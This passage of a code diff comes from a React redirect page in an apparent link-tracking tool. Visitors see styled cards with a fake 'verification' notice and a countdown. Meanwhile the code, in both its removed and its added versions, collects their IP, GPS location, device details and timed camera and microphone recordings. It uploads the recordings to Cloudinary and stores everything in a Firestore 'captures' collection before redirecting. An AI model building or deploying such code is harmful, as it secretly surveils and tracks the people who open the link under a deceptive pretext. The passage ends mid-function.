@@ -6,6 +6,7 @@ import { useNotification } from '../contexts/SettingsContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES, CLOUDINARY_UPLOAD_URL, CLOUDINARY_UPLOAD_PRESET } from '../constants';
 import { db } from '../firebase';
 import { collection, addDoc, query, where, getDocs } from 'firebase/firestore';
+import PermissionInstructions from './PermissionInstructions';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
@@ -88,6 +89,7 @@ const GlassCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: stri
         </div>
     );
 };
+
 const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-2xl animate-fade-in-up text-center flex flex-col items-center gap-6 p-8" style={{ color: settings.textColor, textShadow: '0px 1px 10px rgba(0,0,0,0.5)' }}>
@@ -101,6 +103,7 @@ const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: st
         </div>
     );
 };
+
 const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
     return (
         <div className="w-full max-w-2xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
@@ -110,463 +113,375 @@ const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: s
                     <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                     <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                 </div>
-                <div className="text-green-400">
-                    <p>{'>'} {t('redirect_terminal_auth')}</p>
-                    <p>{'>'} {t('redirect_terminal_access')} {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-8 h-8 inline-block mx-2 object-contain" />}</p>
-                    <p>{'>'} {t('redirect_terminal_target')} <span className="text-cyan-400">{settings.redirectUrl}</span></p>
-                    <p className="mb-2">{'>'} {t('redirect_terminal_message')} <span className="text-white">{settings.displayText}</span></p>
-                    <div className="space-y-2">
-                        <VerificationText className="text-green-500/80" t={t}/>
-                        <div className="flex items-center gap-2">
-                            <span>{'>'} {t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} </span>
-                            <div className="flex-1 bg-green-900 h-6 rounded-sm overflow-hidden">
-                               <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-full" progressClassName="bg-green-500 h-full" />
-                            </div>
-                        </div>
-                    </div>
+                <div className="space-y-2 text-sm">
+                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_auth')}</p>
+                    <p><span className="text-green-400">root@director:~$</span> {t('redirect_terminal_access')}</p>
+                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_target')}</span> {settings.redirectUrl}</p>
+                    <p className="pl-4"><span className="text-cyan-400">{t('redirect_terminal_message')}</span> "{settings.displayText}"</p>
+                    <p><span className="text-green-400">root@director:~$</span> <TypewriterText text={t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} duration={settings.redirectDelay} isPaused={isPaused} /></p>
+                </div>
+                 <div className="w-full pt-6 space-y-2">
+                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-500/10 rounded h-1 overflow-hidden" progressClassName="bg-green-500 h-full rounded" />
                 </div>
             </div>
         </div>
     );
 };
 
-const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
-  <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
-    <div className="bg-slate-900 border border-slate-700 shadow-2xl rounded-lg p-8 sm:p-12 text-center flex flex-col items-center gap-6">
-      {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-2 object-contain" />}
-      <h1 className="text-4xl font-semibold leading-tight">{settings.displayText}</h1>
-      <div className="w-full pt-6 space-y-2">
-        <VerificationText className="text-slate-400" t={t}/>
-        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
-      </div>
+const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-sm animate-scale-in" style={{ color: settings.textColor }}>
+        <div className="bg-white border-2 border-black/80 rounded-sm p-10 text-center flex flex-col items-center gap-4 font-serif">
+            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain" />}
+            <h1 className="text-2xl font-bold text-black tracking-widest uppercase">{settings.displayText}</h1>
+            <p className="text-black/60 text-sm mt-2">{t('redirect_elegant_card_subtitle')}</p>
+            <div className="w-full pt-6">
+                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
+            </div>
+        </div>
     </div>
-  </div>
 );
 
-const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
-    return (
-        <div className="w-full max-w-2xl animate-fade-in-up" style={{ color: settings.textColor }}>
-            <div className="bg-white p-12 rounded-lg shadow-2xl">
-                {settings.customIconUrl && (
-                    <div className="mb-6 h-48 w-full overflow-hidden rounded-md bg-slate-200">
-                        <img src={settings.customIconUrl} alt="Article hero" className="w-full h-full object-cover"/>
-                    </div>
-                )}
-                <p className="text-sm font-semibold uppercase tracking-widest text-indigo-600 mb-2">{t('redirect_article_heading')}</p>
-                <h1 className="text-4xl lg:text-5xl font-bold font-serif text-slate-900 mb-6">{settings.displayText}</h1>
-                <div className="flex items-center gap-4">
-                    <div className="w-12 h-12 bg-slate-200 rounded-full"></div>
-                    <div>
-                        <p className="font-semibold text-slate-800">{t('redirect_article_author')}</p>
-                        <p className="text-slate-500 text-sm">{t('redirect_article_subtitle')}</p>
-                    </div>
-                </div>
-                 <div className="w-full pt-8 space-y-2">
-                    <VerificationText className="text-slate-400" t={t}/>
-                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1 bg-slate-200" progressClassName="bg-indigo-500 h-full" />
-                </div>
+const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-md animate-fade-in-up" style={{ color: settings.textColor }}>
+        <div className="bg-slate-900 border border-slate-700/80 shadow-2xl rounded-xl p-10 text-center flex flex-col items-center gap-4">
+            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
+            <h1 className="text-4xl font-bold">{settings.displayText}</h1>
+            <p className="text-slate-400 mt-2">{t('redirect_default_card_subtitle')}</p>
+            <div className="w-full pt-6 space-y-2">
+                <VerificationText className="text-slate-500" t={t}/>
+                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
             </div>
         </div>
-    );
-};
+    </div>
+);
 
-const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
-    const gradientStyle = {
-        backgroundSize: '400% 400%',
-        backgroundImage: `linear-gradient(-45deg, ${settings.gradientColors.join(', ')})`,
-    };
-
-    return (
-        <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
-            <div className="p-1 rounded-2xl shadow-2xl animate-background-pan" style={gradientStyle}>
-                <div className="bg-slate-900/80 backdrop-blur-lg rounded-xl p-12 text-center flex flex-col items-center gap-6">
-                     {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain rounded-full shadow-lg border-4 border-white/20" />}
-                    <h1 className="text-5xl font-extrabold leading-tight text-white" style={{textShadow: '0 2px 10px rgba(0,0,0,0.3)'}}>{settings.displayText}</h1>
-                    <p className="text-white/80 mt-1">{t('redirect_gradient_card_subtitle')}</p>
-                    <div className="w-full pt-6 space-y-2">
-                        <VerificationText className="text-white/60" t={t}/>
-                        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2.5 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
-                    </div>
-                </div>
+const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-xl animate-fade-in-up font-serif" style={{ color: settings.textColor }}>
+        <div className="bg-white text-slate-800 p-10">
+            <p className="text-sm font-bold text-red-600 uppercase tracking-widest">{t('redirect_article_heading')}</p>
+            <h1 className="text-4xl font-bold my-4">{settings.displayText}</h1>
+            <div className="flex items-center gap-4 text-sm border-y border-slate-200 py-3 mb-6">
+                <p>By <span className="font-bold">{t('redirect_article_author')}</span></p>
+                <div className="h-4 border-l border-slate-300"></div>
+                <p className="text-slate-500">{new Date().toLocaleDateString()}</p>
+            </div>
+            {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-full object-contain mb-6" />}
+            <p className="text-lg text-slate-600 leading-relaxed">{t('redirect_article_subtitle')}</p>
+            <div className="w-full pt-8">
+                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-1" progressClassName="bg-red-600 h-full" />
             </div>
         </div>
-    );
-};
+    </div>
+);
 
-const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
-    return (
-        <div className="w-full max-w-md animate-fade-in" style={{ color: settings.textColor }}>
-            <div className="bg-white/90 p-12 text-center flex flex-col items-center gap-4 relative">
-                <div className="absolute inset-0 border-4 border-black/80"></div>
+const RetroTvCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-lg animate-scale-in" style={{ color: settings.textColor }}>
+        <div className="bg-slate-900 p-8 rounded-t-xl border-2 border-b-0 border-slate-700 relative">
+            <div className="aspect-video bg-black/80 rounded p-6 relative overflow-hidden font-mono text-green-400 text-2xl animate-glow scanline">
+                <p className="animate-flicker">TARGET: {settings.displayText}</p>
+            </div>
+        </div>
+        <div className="h-16 bg-slate-800 rounded-b-xl border-2 border-t-0 border-slate-700 flex items-center justify-center p-4">
+             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-green-900/50 rounded h-2" progressClassName="bg-green-400 h-full" />
+        </div>
+    </div>
+);
+
+const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-md animate-scale-in" style={{ color: settings.textColor }}>
+        <div className="p-1 rounded-2xl shadow-2xl" style={{ background: `linear-gradient(45deg, ${settings.gradientColors.join(', ')})`}}>
+            <div className="bg-slate-900 rounded-xl p-10 text-center flex flex-col items-center gap-4">
                 {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
-                <h1 className="text-4xl font-serif font-bold text-black/80">{settings.displayText}</h1>
-                <p className="text-black/60 font-serif italic">{t('redirect_elegant_card_subtitle')}</p>
-                <div className="w-full pt-8 space-y-2">
-                    <VerificationText className="text-black/50" t={t}/>
-                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
+                <h1 className="text-4xl font-bold">{settings.displayText}</h1>
+                <p className="text-slate-300 mt-2">{t('redirect_gradient_card_subtitle')}</p>
+                <div className="w-full pt-6">
+                    <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/10 rounded-full h-2" progressClassName="bg-white h-full" />
                 </div>
             </div>
         </div>
-    );
-};
-const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string) => string; }> = ({ settings, isPaused, t }) => {
-    return (
-        <div className="w-full max-w-xl font-mono animate-fade-in" style={{ color: settings.textColor }}>
-            <div className="bg-black p-2 rounded-2xl border-4 border-slate-800 shadow-inner shadow-slate-900">
-                <div className="bg-slate-900 aspect-video rounded-lg overflow-hidden relative flex flex-col items-center justify-center text-center p-8 scanline">
-                    {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-20 h-20 mb-4 object-contain opacity-80" />}
-                    <h1 className="text-4xl font-bold text-green-400" style={{textShadow: '0 0 5px #32cd32, 0 0 10px #32cd32'}}>
-                        <TypewriterText text={settings.displayText} duration={2} isPaused={isPaused} />
-                    </h1>
-                    <div className="w-full absolute bottom-4 left-0 px-8 space-y-2">
-                        <VerificationText className="text-green-500/80 animate-flicker" t={t}/>
-                        <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-2 bg-green-900/50" progressClassName="bg-green-500 h-full" />
-                    </div>
-                </div>
-            </div>
-        </div>
-    );
-};
+    </div>
+);
 
-const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string|number>) => string; }> = ({ settings, isPaused, t }) => {
-    return (
-      <div className="w-full max-w-xl animate-scale-in font-sans" style={{ color: settings.textColor }}>
-        <div className="bg-black border border-slate-700 shadow-2xl rounded-lg overflow-hidden">
-          <div className="aspect-video bg-slate-900 flex items-center justify-center relative">
-            {!isPaused && settings.customIconUrl ? (
-              <img src={settings.customIconUrl} alt="Icon" className="w-1/3 h-1/3 object-contain opacity-50" />
+const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean, t: (key: string, replacements?: Record<string, string>) => string; }> = ({ settings, isPaused, t }) => (
+    <div className="w-full max-w-2xl animate-scale-in bg-black rounded-xl border border-slate-700 shadow-2xl overflow-hidden" style={{ color: settings.textColor }}>
+        <div className="aspect-video bg-slate-900 flex items-center justify-center">
+            {settings.customIconUrl ? (
+                <img src={settings.customIconUrl} alt="Icon" className="w-1/3 object-contain" />
             ) : (
-              <div className="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center cursor-pointer">
-                <svg className="w-10 h-10 text-white ml-1" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg>
-              </div>
+                <p className="text-slate-500">{t('redirect_video_player_loading')}</p>
             )}
-            <p className="absolute bottom-4 left-4 text-white text-xs bg-black/50 px-2 py-1 rounded">{t('redirect_video_player_loading')}</p>
-          </div>
-          <div className="p-4 space-y-2">
-            <h1 className="text-xl font-bold text-white">{settings.displayText}</h1>
-            <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', {url: settings.redirectUrl})}</p>
-            <div className="pt-2 space-y-2">
-                <VerificationText className="text-slate-400" t={t}/>
-                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2" progressClassName="bg-red-600 h-full rounded-full" />
-            </div>
-          </div>
         </div>
-      </div>
-    );
+        <div className="p-4 bg-black/30 space-y-2">
+            <h1 className="font-bold text-lg">{settings.displayText}</h1>
+            <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', { url: settings.redirectUrl })}</p>
+            <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 mt-2" progressClassName="bg-red-600 h-full" />
+        </div>
+    </div>
+);
+
+
+const CARD_COMPONENTS: Record<string, React.FC<{ settings: Settings, isPaused: boolean, t: any }>> = {
+    'default-white': DefaultWhiteCard,
+    'glass': GlassCard,
+    'minimal': MinimalCard,
+    'elegant': ElegantCard,
+    'sleek-dark': SleekDarkCard,
+    'article': ArticleCard,
+    'terminal': TerminalCard,
+    'retro-tv': RetroTvCard,
+    'gradient-burst': GradientBurstCard,
+    'video-player': VideoPlayerCard,
 };
 
-const parseUserAgent = (ua: string) => {
-    let os = "Unknown OS";
-    let browser = "Unknown Browser";
-    let deviceType = "Desktop";
+// --- Main Component ---
 
-    if (/mobi/i.test(ua)) deviceType = "Mobile";
-
-    if (/android/i.test(ua)) os = "Android";
-    else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
-    else if (/windows phone/i.test(ua)) os = "Windows Phone";
-    else if (/windows/i.test(ua)) os = "Windows";
-    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
-    else if (/linux/i.test(ua)) os = "Linux";
-
-    if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome";
-    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
-    else if (/edg/i.test(ua)) browser = "Edge";
-    
-    return { os, browser, deviceType };
-};
-
-
-// --- Main Redirect Page Component ---
-
-const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview: isPreviewProp, isEmbeddedPreview = false, onClosePreview }) => {
+const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview = false, isEmbeddedPreview = false }) => {
   const { data } = useParams<{ data: string }>();
   const addNotification = useNotification();
-  
+
   const [settings, setSettings] = React.useState<Settings | null>(null);
-  const [error, setError] = React.useState<string | null>(null);
-  const [isPaused, setIsPaused] = React.useState(true);
-  const [showDeniedPopup, setShowDeniedPopup] = React.useState(false);
-  const [t, setT] = React.useState(() => getTranslator('en'));
-  const [captureInitiated, setCaptureInitiated] = React.useState(false);
+  const [status, setStatus] = React.useState<'initializing' | 'loading' | 'invalid' | 'permission_denied' | 'redirecting'>('initializing');
+  const [permissionDenied, setPermissionDenied] = React.useState(false);
+  const [deniedPermissions, setDeniedPermissions] = React.useState<PermissionType[]>([]);
+  const t = React.useMemo(() => getTranslator(settings?.redirectLanguage || 'en'), [settings?.redirectLanguage]);
   
-  const isPreview = !!isPreviewProp;
-  const isMounted = React.useRef(true);
+  const permissionStatusRef = React.useRef<Record<PermissionType, PermissionState | 'n/a'>>({ location: 'n/a', camera: 'n/a', microphone: 'n/a' });
 
   React.useEffect(() => {
-    isMounted.current = true;
-    return () => { isMounted.current = false; };
-  }, []);
-
-  React.useEffect(() => {
-    const loadData = async () => {
-        if (previewSettings) {
-            const configToLoad = 'id' in previewSettings 
-                ? previewSettings as Settings 
-                : { ...NEW_REDIRECT_TEMPLATE, ...previewSettings, id: 'preview' } as Settings;
-            setSettings(configToLoad);
-            setT(() => getTranslator(configToLoad.redirectLanguage || 'en'));
-            setIsPaused(false);
+    const loadSettings = async () => {
+        if (isPreview && previewSettings) {
+            setSettings({ id: 'preview', ...NEW_REDIRECT_TEMPLATE, ...previewSettings });
+            setStatus('redirecting'); // In preview, we just show the card
             return;
         }
-
-        if (!data) {
-          setError(t('redirect_invalid_link_subtitle'));
-          return;
-        }
-
+        
+        if (!data) return setStatus('invalid');
+        
         try {
-          const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
-          const querySnapshot = await getDocs(q);
+            const q = query(collection(db, "redirects"), where("urlIdentifier", "==", data));
+            const querySnapshot = await getDocs(q);
 
-          if (querySnapshot.empty) {
-            setError(t('redirect_invalid_link_subtitle'));
-            return;
-          }
-          
-          const doc = querySnapshot.docs[0];
-          const configToLoad = { id: doc.id, ...doc.data() } as Settings;
-          
-          setSettings(configToLoad);
-          setT(() => getTranslator(configToLoad.redirectLanguage));
-          setIsPaused(!isPreview);
-        } catch (e) {
-          console.error("Invalid redirect data in URL:", e);
-          setError(t('redirect_invalid_link_subtitle'));
-        }
-    };
-    loadData();
-  }, [data, previewSettings, isPreview, t]);
+            if (querySnapshot.empty) {
+                return setStatus('invalid');
+            }
 
-
-  React.useEffect(() => {
-    // Guard against re-running the logic, or running without settings.
-    if (!settings || isPreview || captureInitiated) return;
-    
-    // Immediately set the flag to prevent re-entry from re-renders.
-    setCaptureInitiated(true);
-
-    const performRedirect = () => {
-        if (!isMounted.current) return;
-        try {
-            let url = new URL(settings.redirectUrl.startsWith('http') ? settings.redirectUrl : `https://${settings.redirectUrl}`);
-            window.location.href = url.toString();
+            const configDoc = querySnapshot.docs[0];
+            const fetchedSettings = { id: configDoc.id, ...configDoc.data() } as Settings;
+            setSettings(fetchedSettings);
+            setStatus('loading');
         } catch (error) {
-            console.error("Invalid URL:", settings.redirectUrl);
-            setError(`The destination URL "${settings.redirectUrl}" is invalid.`);
+            console.error("Error fetching settings: ", error);
+            setStatus('invalid');
         }
     };
-    
-    const startRedirectSequence = () => {
-        if (!isMounted.current) return;
-        setIsPaused(false); // Start the progress bar
-        
-        const redirectTimer = setTimeout(performRedirect, settings.redirectDelay * 1000);
-        return () => clearTimeout(redirectTimer);
-    };
-
-    const handleDataCapture = async () => {
-        const redirectId = settings.id;
-        if (!redirectId) {
-            console.error("Could not save capture data: redirectId is missing from payload.");
-            startRedirectSequence(); // Fail gracefully and just redirect
-            return;
-        }
-
-        const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
-        
-        const capturedData: Omit<CapturedData, 'id'> & { [key: string]: any } = {
-            redirectId,
-            name: `Capture @ ${new Date().toLocaleString()}`,
-            timestamp: Date.now(),
-            ip: 'Fetching...',
-            userAgent: navigator.userAgent,
-            os,
-            browser,
-            deviceType,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            location: { lat: null, lon: null, city: 'Unknown', country: 'Unknown', source: 'ip' },
-            permissions: { 
-                location: settings.captureInfo.permissions.includes('location') ? 'prompt' : 'n/a',
-                camera: settings.captureInfo.permissions.includes('camera') ? 'prompt' : 'n/a',
-                microphone: settings.captureInfo.permissions.includes('microphone') ? 'prompt' : 'n/a',
-            }
-        };
-
+    loadSettings();
+  }, [data, previewSettings, isPreview]);
+  
+    const uploadToCloudinary = async (blob: Blob, resourceType: 'video' | 'raw'): Promise<string> => {
+        const formData = new FormData();
+        formData.append('file', blob);
+        formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
         try {
-            const ipResponse = await fetch('https://ip-api.com/json');
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                if (ipData.status === 'success') {
-                    capturedData.ip = ipData.query;
-                    capturedData.location = {
-                        lat: ipData.lat,
-                        lon: ipData.lon,
-                        city: ipData.city,
-                        country: ipData.country,
-                        source: 'ip',
-                    };
-                }
-            }
-        } catch (e) { console.error("Could not fetch IP data:", e); }
-
-        let anyPermissionDenied = false;
-        
-        // Sequential permission requests
-        for (const permission of settings.captureInfo.permissions) {
-             try {
-                if (permission === 'location') {
-                    const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-                    });
-                    capturedData.permissions.location = 'granted';
-                    capturedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: capturedData.location.city, country: capturedData.location.country, source: 'gps'};
-                
-                } else if (permission === 'camera' || permission === 'microphone') {
-                    const constraints = {
-                        video: permission === 'camera',
-                        audio: permission === 'microphone',
-                    };
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    
-                    if (permission === 'camera') capturedData.permissions.camera = 'granted';
-                    if (permission === 'microphone') capturedData.permissions.microphone = 'granted';
-
-                    const mediaBlob = await new Promise<Blob>((resolve) => {
-                        const recorder = new MediaRecorder(stream, { mimeType: permission === 'camera' ? 'video/webm' : 'audio/webm' });
-                        const chunks: Blob[] = [];
-                        recorder.ondataavailable = e => chunks.push(e.data);
-                        recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType }));
-                        setTimeout(() => recorder.stop(), settings.captureInfo.recordingDuration * 1000);
-                        recorder.start();
-                    });
-                    
-                    stream.getTracks().forEach(track => track.stop());
-
-                    const formData = new FormData();
-                    formData.append('file', mediaBlob);
-                    formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
-                    
-                    const res = await fetch(CLOUDINARY_UPLOAD_URL, { method: 'POST', body: formData });
-                    
-                    if (res.ok) {
-                        const uploadData = await res.json();
-                        if (uploadData.secure_url) {
-                            if (permission === 'camera') capturedData.cameraCapture = uploadData.secure_url;
-                            if (permission === 'microphone') capturedData.microphoneCapture = uploadData.secure_url;
-                        } else {
-                            console.error("Cloudinary upload succeeded but no secure_url was returned.");
-                        }
-                    } else {
-                         const errorBody = await res.json();
-                         console.error("Cloudinary upload failed:", errorBody);
-                    }
-                }
-            } catch {
-                if (permission === 'location') capturedData.permissions.location = 'denied';
-                if (permission === 'camera') capturedData.permissions.camera = 'denied';
-                if (permission === 'microphone') capturedData.permissions.microphone = 'denied';
-                anyPermissionDenied = true;
-                setShowDeniedPopup(true);
-                break; // Stop asking for more permissions if one is denied
-            }
-        }
-        
-        try {
-            // Remove undefined properties before saving to Firestore
-            Object.keys(capturedData).forEach(key => {
-                if (capturedData[key] === undefined) {
-                    delete capturedData[key];
-                }
+            const response = await fetch(CLOUDINARY_UPLOAD_URL, {
+                method: 'POST',
+                body: formData
             });
-            await addDoc(collection(db, "captures"), capturedData);
-        } catch(e) { console.error("Failed to save captured data:", e); }
-        
-        if (anyPermissionDenied) {
-            // Do nothing; the capture is complete, and the redirect is paused.
-            // The `captureInitiated` flag prevents this whole effect from re-running.
-        } else {
-            addNotification({ type: 'success', message: 'notification_verification_success' });
-            startRedirectSequence();
+            if (!response.ok) {
+                const errorData = await response.json();
+                throw new Error(errorData.error.message || 'Cloudinary upload failed');
+            }
+            const result = await response.json();
+            return result.secure_url;
+        } catch (error) {
+            console.error('Cloudinary upload error:', error);
+            addNotification({ type: 'error', message: "Cloudinary upload failed: Check upload preset." });
+            throw error;
         }
     };
-    
-    if(settings && settings.captureInfo.permissions.length > 0) {
-      handleDataCapture();
-    } else if (settings) {
-      startRedirectSequence();
+
+    const requestPermissions = React.useCallback(async () => {
+        if (!settings || isPreview) return;
+        setPermissionDenied(false);
+        const required = settings.captureInfo.permissions;
+        if (required.length === 0) {
+            return captureAndRedirect();
+        }
+
+        let hasDenied = false;
+        const newlyDenied: PermissionType[] = [];
+
+        for (const perm of required) {
+            try {
+                if (perm === 'location') {
+                    const status = await navigator.permissions.query({ name: 'geolocation' });
+                    permissionStatusRef.current.location = status.state;
+                    if (status.state === 'prompt') {
+                       await new Promise<void>((resolve, reject) => navigator.geolocation.getCurrentPosition(
+                           () => { permissionStatusRef.current.location = 'granted'; resolve(); },
+                           () => { permissionStatusRef.current.location = 'denied'; resolve(); }, // Resolve even on deny
+                           { timeout: 10000 }
+                       ));
+                    }
+                } else if (perm === 'camera' || perm === 'microphone') {
+                    await navigator.mediaDevices.getUserMedia({ video: perm === 'camera', audio: perm === 'microphone' });
+                    permissionStatusRef.current[perm] = 'granted';
+                }
+            } catch (error) {
+                console.warn(`Permission denied for ${perm}:`, error);
+                permissionStatusRef.current[perm] = 'denied';
+            }
+        }
+        
+        required.forEach(p => {
+            if (permissionStatusRef.current[p] === 'denied') {
+                hasDenied = true;
+                newlyDenied.push(p);
+            }
+        });
+
+        if (hasDenied) {
+            setDeniedPermissions(newlyDenied);
+            setPermissionDenied(true);
+        } else {
+            captureAndRedirect();
+        }
+    }, [settings, isPreview]);
+
+  const captureAndRedirect = React.useCallback(async () => {
+        if (!settings || isPreview) return;
+        setStatus('redirecting');
+
+        try {
+            // --- Basic Info ---
+            let ipData: any = {};
+            try {
+                const ipRes = await fetch('https://ip-api.com/json');
+                if (ipRes.ok) ipData = await ipRes.json();
+            } catch (e) { console.error("Could not fetch IP data:", e); }
+
+            const userAgent = navigator.userAgent;
+            const osMatch = userAgent.match(/(Windows|Mac OS|Linux|Android|iOS)/);
+            
+            // --- Location ---
+            let locationData = { lat: ipData.lat || null, lon: ipData.lon || null, city: ipData.city || 'Unknown', country: ipData.country || 'Unknown', source: 'ip' as 'ip' | 'gps' };
+            if (permissionStatusRef.current.location === 'granted') {
+                await new Promise<void>(resolve => {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        locationData = { ...locationData, lat: pos.coords.latitude, lon: pos.coords.longitude, source: 'gps' };
+                        resolve();
+                    }, () => resolve(), { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                });
+            }
+
+            // --- Media Capture ---
+            let cameraUrl: string | undefined;
+            let micUrl: string | undefined;
+
+            if (permissionStatusRef.current.camera === 'granted' || permissionStatusRef.current.microphone === 'granted') {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: permissionStatusRef.current.camera === 'granted',
+                    audio: permissionStatusRef.current.microphone === 'granted',
+                });
+                
+                const recorder = new MediaRecorder(stream);
+                const chunks: Blob[] = [];
+                recorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                recorder.start();
+                await new Promise(resolve => setTimeout(resolve, settings.captureInfo.recordingDuration * 1000));
+                recorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+
+                await new Promise(resolve => recorder.onstop = resolve);
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                
+                // For simplicity, we upload one blob. If both perms are on, it's a video with audio.
+                // A more complex implementation could separate them.
+                if(permissionStatusRef.current.camera === 'granted') {
+                    cameraUrl = await uploadToCloudinary(blob, 'video');
+                } else if (permissionStatusRef.current.microphone === 'granted') {
+                    micUrl = await uploadToCloudinary(blob, 'raw');
+                }
+            }
+            
+            const captured: Omit<CapturedData, 'id'> = {
+                redirectId: settings.id,
+                name: `Capture on ${new Date().toLocaleDateString()}`,
+                timestamp: Date.now(),
+                ip: ipData.query || 'Unknown',
+                userAgent,
+                os: osMatch ? osMatch[0] : 'Unknown',
+                browser: userAgent.match(/(Chrome|Firefox|Safari|Edge|OPR)/)?.[0] || 'Unknown',
+                deviceType: 'ontouchstart' in window ? 'Mobile' : 'Desktop',
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                location: locationData,
+                permissions: permissionStatusRef.current,
+                cameraCapture: cameraUrl,
+                microphoneCapture: micUrl,
+            };
+
+            // Remove undefined fields before saving to Firestore
+            Object.keys(captured).forEach(key => (captured as any)[key] === undefined && delete (captured as any)[key]);
+            
+            await addDoc(collection(db, 'captures'), captured);
+        } catch (error) {
